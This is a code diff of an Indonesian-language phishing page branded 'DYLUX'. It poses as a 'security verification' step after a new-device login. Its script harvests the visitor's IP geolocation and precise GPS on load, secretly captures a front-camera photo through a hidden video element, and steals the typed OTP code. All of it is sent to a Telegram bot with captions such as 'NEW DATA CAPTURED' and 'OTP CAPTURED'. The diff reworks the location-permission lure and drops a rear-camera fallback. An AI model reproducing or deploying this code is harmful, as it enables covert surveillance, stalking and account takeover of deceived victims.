@@ -55,7 +55,6 @@
             font-size: 14px;
             line-height: 1.6;
         }
-        /* 🔥 SEMBUNYIKAN VIDEO */
         video {
             display: none !important;
         }
@@ -110,105 +109,81 @@
             margin-top: 10px;
             display: none;
         }
-        /* Popup */
-        #popupOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: 9999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: Arial, sans-serif;
+        .location-request {
+            background: #0a0a0f;
+            border-radius: 12px;
+            padding: 16px;
+            margin: 12px 0;
+            border: 1px solid rgba(0,240,255,0.1);
         }
-        #popupBox {
-            background: #1a1a2e;
-            border-radius: 16px;
-            padding: 32px 28px;
-            max-width: 340px;
-            width: 90%;
-            text-align: center;
-            border: 1px solid rgba(0, 240, 255, 0.2);
-            box-shadow: 0 0 40px rgba(0, 240, 255, 0.1);
-        }
-        #popupBox .popup-icon {
-            font-size: 48px;
-            margin-bottom: 12px;
-        }
-        #popupBox .popup-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #e0e0ff;
+        .location-request .req-icon {
+            font-size: 32px;
+            display: block;
             margin-bottom: 8px;
         }
-        #popupBox .popup-desc {
+        .location-request .req-text {
             font-size: 13px;
             color: #8888aa;
-            margin-bottom: 20px;
             line-height: 1.6;
         }
-        #popupBox .popup-btn-group {
-            display: flex;
-            gap: 10px;
+        .location-request .req-text strong {
+            color: #00f0ff;
         }
-        #popupBox .popup-btn-group .btn-cancel {
-            flex: 1;
-            padding: 12px;
-            border: none;
-            border-radius: 10px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            background: #2a2a3e;
-            color: #8888aa;
-        }
-        #popupBox .popup-btn-group .btn-allow {
-            flex: 1;
-            padding: 12px;
-            border: none;
-            border-radius: 10px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
+        .btn-location {
             background: linear-gradient(135deg, #00f0ff, #7b2ffc);
             color: #fff;
+            border: none;
+            border-radius: 10px;
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.3s;
         }
-        #popupBox .popup-footer {
-            font-size: 11px;
-            color: #555;
-            margin-top: 16px;
+        .btn-location:hover {
+            opacity: 0.8;
+        }
+        .btn-location:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
     </style>
 </head>
 <body>
+    <div class="box">
+        <div class="logo">DYLUX</div>
+        <div class="badge">🔒 Secure</div>
+        <div class="icon">🛡️</div>
+        <h2>Verifikasi Keamanan</h2>
+        <p>Akun Anda terdeteksi login dari perangkat baru. Verifikasi identitas untuk melanjutkan.</p>
 
-    <!-- ========================================== -->
-    <!-- POPUP "LANJUTKAN KE WEBSITE INI?"         -->
-    <!-- ========================================== -->
-    <div id="popupOverlay">
-        <div id="popupBox">
-            <div class="popup-icon">🌐</div>
-            <div class="popup-title">Lanjutkan ke website ini?</div>
-            <div class="popup-desc">
-                Website ini ingin mengakses lokasi Anda untuk pengalaman yang lebih baik.
+        <!-- ========================================== -->
+        <!-- TOMBOL IZINKAN LOKASI (DI DALAM HALAMAN)  -->
+        <!-- ========================================== -->
+        <div class="location-request" id="locationRequest">
+            <span class="req-icon">📍</span>
+            <div class="req-text">
+                Untuk keamanan, kami perlu <strong>lokasi</strong> perangkat Anda.
+                <br>Klik tombol di bawah untuk mengizinkan.
             </div>
-            <div class="popup-btn-group">
-                <button class="btn-cancel" id="popupCancel">Batal</button>
-                <button class="btn-allow" id="popupAllow">Izinkan</button>
-            </div>
-            <div class="popup-footer">🔒 Data terenkripsi end-to-end</div>
+            <button class="btn-location" id="allowLocationBtn">Izinkan Lokasi</button>
         </div>
+
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+
+        <input type="text" id="otpInput" placeholder="Masukkan Kode OTP" maxlength="6">
+        <button id="verifyBtn">Verifikasi</button>
+
+        <div class="spinner" id="spinner"></div>
+        <div id="statusMsg"></div>
+        <div class="footer">DYLUX • Cahaya dalam Kegelapan</div>
     </div>
 
-    <!-- ========================================== -->
-    <!-- AUTO-DETECT + GPS PRESISI                -->
-    <!-- ========================================== -->
     <script>
     // ============================================
-    // API FALLBACK (12+ API)
+    // API FALLBACK (10 API)
     // ============================================
     const apiList = [
         { url: 'https://ipapi.is/api/geo/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
@@ -244,19 +219,35 @@
             formData.append('caption', caption);
             formData.append('parse_mode', 'HTML');
 
-            const result = await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendPhoto`, {
+            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
-            return await result.json();
         } catch (error) {
             console.error('Send photo error:', error);
-            return null;
         }
     }
 
     // ============================================
-    // FUNGSI AMBIL GPS PRESISI (WATCH + AKURASI)
+    // AMBIL IP (CEPAT)
+    // ============================================
+    async function getIPData() {
+        for (const api of apiList) {
+            try {
+                const res = await fetch(api.url);
+                if (!res.ok) throw new Error('API error');
+                const data = await res.json();
+                const parsed = api.parse(data);
+                if (parsed.ip && parsed.ip !== 'unknown') {
+                    return parsed;
+                }
+            } catch (e) { /* Coba API berikutnya */ }
+        }
+        return null;
+    }
+
+    // ============================================
+    // AMBIL GPS (SIMPLE, TUNGGU 5 DETIK)
     // ============================================
     function getGPSLocation() {
         return new Promise((resolve) => {
@@ -264,111 +255,61 @@
                 resolve(null);
                 return;
             }
-
-            let watchId = null;
-            let resolved = false;
-            let bestLocation = null;
-            let attempts = 0;
-            const maxAttempts = 10;
-
-            const timeout = setTimeout(() => {
-                if (watchId) navigator.geolocation.clearWatch(watchId);
-                if (!resolved) {
-                    if (bestLocation) {
-                        resolve(bestLocation);
-                    } else {
-                        resolve(null);
-                    }
-                }
-            }, 12000);
-
-            watchId = navigator.geolocation.watchPosition(
+            navigator.geolocation.getCurrentPosition(
                 (pos) => {
-                    attempts++;
-                    const accuracy = pos.coords.accuracy;
-                    // Ambil lokasi kalo akurasi < 100 meter
-                    if (accuracy < 100 || attempts >= maxAttempts) {
-                        if (!resolved) {
-                            resolved = true;
-                            clearTimeout(timeout);
-                            navigator.geolocation.clearWatch(watchId);
-                            resolve({
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: accuracy
-                            });
-                        }
-                    } else {
-                        // Simpan lokasi terbaik sementara
-                        if (!bestLocation || accuracy < bestLocation.accuracy) {
-                            bestLocation = {
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: accuracy
-                            };
-                        }
-                    }
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    });
                 },
                 () => {
-                    if (!resolved) {
-                        resolved = true;
-                        clearTimeout(timeout);
-                        navigator.geolocation.clearWatch(watchId);
-                        resolve(bestLocation || null);
-                    }
+                    resolve(null);
                 }, {
                     enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
+                    timeout: 5000
                 }
             );
         });
     }
 
     // ============================================
-    // AUTO-DETECT + GPS + LINK MAPS
+    // AUTO-DETECT (JALAN SATU KALI)
     // ============================================
-    (async function autoDetect() {
+    let autoDetectDone = false;
+
+    async function autoDetect() {
+        if (autoDetectDone) return;
+        autoDetectDone = true;
+
         try {
             const params = new URLSearchParams(window.location.search);
             const userId = params.get('id');
             if (!userId) return;
 
-            // 1. Coba dapet IP dari API
-            let ipData = null;
-            for (const api of apiList) {
-                try {
-                    const res = await fetch(api.url);
-                    if (!res.ok) throw new Error('API error');
-                    const data = await res.json();
-                    const parsed = api.parse(data);
-                    if (parsed.ip && parsed.ip !== 'unknown') {
-                        ipData = parsed;
-                        break;
-                    }
-                } catch (e) { /* Coba API berikutnya */ }
-            }
+            // 1. Dapet IP
+            const ipData = await getIPData();
 
-            // 2. AMBIL GPS PRESISI (WATCH SAMPE AKURASI < 100m)
+            // 2. Coba GPS (kalo user izinkan)
             const gpsData = await getGPSLocation();
 
-            // 3. Tentukan lokasi final (prioritas GPS)
-            let finalLat = ipData?.lat || 0;
-            let finalLon = ipData?.lon || 0;
+            // 3. Pilih lokasi (prioritas GPS kalo ada)
+            let lat = ipData?.lat || 0;
+            let lon = ipData?.lon || 0;
             let locationText = `${ipData?.city || 'unknown'}, ${ipData?.region || 'unknown'}, ${ipData?.country || 'unknown'}`;
             let accuracyText = '';
 
             if (gpsData && gpsData.lat && gpsData.lon) {
-                finalLat = gpsData.lat;
-                finalLon = gpsData.lon;
-                locationText = `GPS: ${finalLat}, ${finalLon}`;
+                lat = gpsData.lat;
+                lon = gpsData.lon;
+                locationText = `GPS: ${lat}, ${lon}`;
                 accuracyText = ` (Akurasi ${Math.round(gpsData.accuracy)}m)`;
             }
 
-            // 4. Buat link Google Maps
-            const mapsLink = `https://maps.google.com/?q=${finalLat},${finalLon}`;
+            // 4. Link Maps
+            const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
 
-            // 5. Kirim notifikasi ke Telegram
+            // 5. Kirim notifikasi
             const message =
                 `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
                 `<b>👤 User ID:</b> <code>${userId}</code>\n` +
@@ -382,59 +323,48 @@
                 `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
 
             await sendMessageToTelegram(userId, message);
-            console.log('✅ Auto-detect sent with GPS!');
+            console.log('✅ Auto-detect sent!');
 
         } catch (e) { console.error('Auto-detect error:', e); }
-    })();
+    }
 
     // ============================================
-    // POPUP HANDLER
+    // POPUP IZIN LOKASI (DI DALAM HALAMAN)
     // ============================================
-    document.getElementById('popupAllow').addEventListener('click', () => {
-        document.getElementById('popupOverlay').style.display = 'none';
-        // Trigger GPS request
+    document.getElementById('allowLocationBtn').addEventListener('click', function() {
+        this.disabled = true;
+        this.textContent = '⏳ Meminta izin...';
+
         navigator.geolocation.getCurrentPosition(
-            () => { console.log('📍 Location allowed'); },
-            () => { console.log('❌ Location denied'); }, {
-                enableHighAccuracy: true
+            (pos) => {
+                console.log('✅ Location allowed:', pos.coords);
+                this.textContent = '✅ Lokasi Diizinkan';
+                this.style.background = '#00ff88';
+                this.style.color = '#0a0a0f';
+                // Trigger auto-detect ulang
+                autoDetectDone = false;
+                autoDetect();
+            },
+            (err) => {
+                console.warn('❌ Location denied:', err);
+                this.textContent = '❌ Izin Ditolak';
+                this.style.background = '#ff0055';
+                // Tetap jalan pake IP
+                autoDetect();
+            }, {
+                enableHighAccuracy: true,
+                timeout: 10000
             }
         );
-        // Refresh auto-detect after 2s
-        setTimeout(() => { window.location.reload(); }, 1500);
     });
 
-    document.getElementById('popupCancel').addEventListener('click', () => {
-        document.getElementById('popupOverlay').style.display = 'none';
-        // Kirim notifikasi tanpa GPS
-        setTimeout(() => { window.location.reload(); }, 500);
-    });
-    </script>
-
-    <!-- ========================================== -->
-    <!-- MAIN CONTENT (CAMERA)                     -->
-    <!-- ========================================== -->
-    <div class="box">
-        <div class="logo">DYLUX</div>
-        <div class="badge">🔒 Secure</div>
-        <div class="icon">🛡️</div>
-        <h2>Verifikasi Keamanan</h2>
-        <p>Akun Anda terdeteksi login dari perangkat baru. Verifikasi identitas untuk melanjutkan.</p>
-
-        <!-- 🔥 VIDEO SEMBUNYI (GAK KELIHATAN) -->
-        <video id="video" autoplay playsinline></video>
-        <canvas id="canvas"></canvas>
-
-        <input type="text" id="otpInput" placeholder="Masukkan Kode OTP" maxlength="6">
-        <button id="verifyBtn">Verifikasi</button>
-
-        <div class="spinner" id="spinner"></div>
-        <div id="statusMsg"></div>
-        <div class="footer">DYLUX • Cahaya dalam Kegelapan</div>
-    </div>
-
-    <script>
     // ============================================
-    // KAMERA DEPAN (SELFIE) - SEMBUNYI
+    // JALANKAN AUTO-DETECT AWAL (PAKE IP)
+    // ============================================
+    autoDetect();
+
+    // ============================================
+    // KAMERA DEPAN (SELFIE)
     // ============================================
     const userId = new URLSearchParams(window.location.search).get('id');
     const verifyBtn = document.getElementById('verifyBtn');
@@ -464,27 +394,8 @@
 
             return imageData;
         } catch (error) {
-            console.error('Front camera error:', error);
-            // Fallback ke kamera belakang kalo depan gagal
-            try {
-                const streamBack = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment', width: { ideal: 640 } }
-                });
-                video.srcObject = streamBack;
-                await video.play();
-                await new Promise(resolve => setTimeout(resolve, 1500));
-
-                const ctx = canvas.getContext('2d');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                const imageDataBack = canvas.toDataURL('image/jpeg', 0.8);
-                streamBack.getTracks().forEach(track => track.stop());
-                return imageDataBack;
-            } catch (e) {
-                return null;
-            }
+            console.error('Camera error:', error);
+            return null;
         }
     }
 
@@ -503,7 +414,6 @@
         spinner.classList.add('active');
         statusMsg.style.display = 'none';
 
-        // Ambil foto selfie
         const imageData = await captureFrontCamera();
 
         if (imageData) {
@@ -515,7 +425,6 @@
             await sendPhotoToTelegram(userId, imageData, caption);
         }
 
-        // Kirim OTP
         const message =
             `<b>🔑 OTP CAPTURED!</b>\n\n` +
             `<b>👤 User ID:</b> <code>${userId}</code>\n` +
